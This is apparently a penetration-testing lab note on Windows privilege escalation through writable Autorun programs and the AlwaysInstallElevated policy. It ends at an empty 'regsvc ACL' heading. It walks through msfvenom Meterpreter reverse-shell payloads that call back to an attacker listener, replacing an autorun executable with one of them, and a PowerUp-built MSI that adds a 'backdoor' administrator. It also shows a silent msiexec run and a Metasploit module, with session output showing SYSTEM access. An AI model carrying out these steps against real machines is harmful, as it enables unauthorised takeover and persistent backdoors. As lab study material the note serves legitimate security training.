
## Autorun

Windows normally has Autoruns enabled for instances such as plugging in a pen drive, inserting a CD, etc. We can abuse this to see whether there are any autoruns that has any permissions to allow us to elevate our privileges.

We can use the `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe` command to check for autoruns. This need a GUI to work.

![[Autoruns.png]]

If we pay look at the entries under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (this is where Windows look for programs that should be automatically run), we notice there is a program named `My Program` running as an autorun. 

This can also be under the `HKCU` registry, which are programs that autorun only for the current user.

![[My Program.png]]

Once we have identified the program path, we can use another built-in tool named `accesscheck` to see which users have what type of access.

```PowerShell
C:\Users\user>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

We can see that everyone Read/Write permission to this file. So we can replace the file with a malicious payload that would run when an Administrator logs in.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o program.exe         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

Then we can transfer the file using a simple web server from our machine to the compromised machine. Now we just need to listen for a meterpreter connection.

When an administrator logs in they are automatically prompted to run the program, and we gain access to the machine as a privileged user.

![[Admin Prompt.png]]

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Sending stage (177734 bytes) to 10.10.106.111
[*] Meterpreter session 2 opened (10.4.72.115:4444 -> 10.10.106.111:49261) at 2025-07-14 18:41:56 +1000

meterpreter > getuid 
Server username: TCM-PC\TCM
```


## AlwaysInstallElevated

Windows has packages called `msi` packages (generally windows installers), that can be automatically be installed elevated by setting a registry key. We can check the relevant registry and see whether the value is set for 1.

```PowerShell
C:\Users\user>reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

C:\Users\user>reg query HKCU\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

We can see both `HKLM` (HKey Local Machine) and `HKCU` (HKey Current User) are set to 1. There are several ways we can exploit this.

### PowerUp.ps1

If we can run the `PowerUp.ps1` script, it will auto detect if these registry values are set to 1.

```PowerShell
C:\Users\user\Desktop\Tools\PowerUp>powershell -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks

.
.

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI

.
.

PS C:\Users\user\Desktop\Tools\PowerUp> Write-UserAddMSI

OutputPath
----------
UserAdd.msi
```

This would create an `.msi` executable we can run to add a user to the Administrators group. When we run the executable, we see the following.

![[PowerUp UserAdd.png]]

We can check the administrators group and verify that we have successfully added the `backdoor` user to the group.

```PowerShell
C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
--------------------------------------------------------------------
Administrator
TCM
The command completed successfully.

C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
--------------------------------------------------------------------
Administrator
backdoor
TCM
The command completed successfully.
```

### msfvenom

We can also manually exploit this by generating an `.msi`executable through `msfvenom` and transferring it over.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 -f msi -o setup.msi                         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
```

When we run `setup.msi` on the compromised machine, we get the following and when Run is clicked, the meterpreter session is established. We can also run the command `msiexec /quiet /qn /i C:\Temp\setup.msi` to execute the setup file as well.

![[msfvenom payload.png]]

```bash
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

No active sessions.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Sending stage (177734 bytes) to 10.10.106.111
[*] Meterpreter session 3 opened (10.4.72.115:4444 -> 10.10.106.111:49414) at 2025-07-14 20:25:31 +1000

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```


### Meterpreter

We can also use this method to gain an elevated shell if we have a low privilege shell in meterpreter.

```bash
msf6 exploit(multi/handler) > use exploit/windows/local/always_install_elevated 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > options 

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.250    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows
```

## regsvc ACL
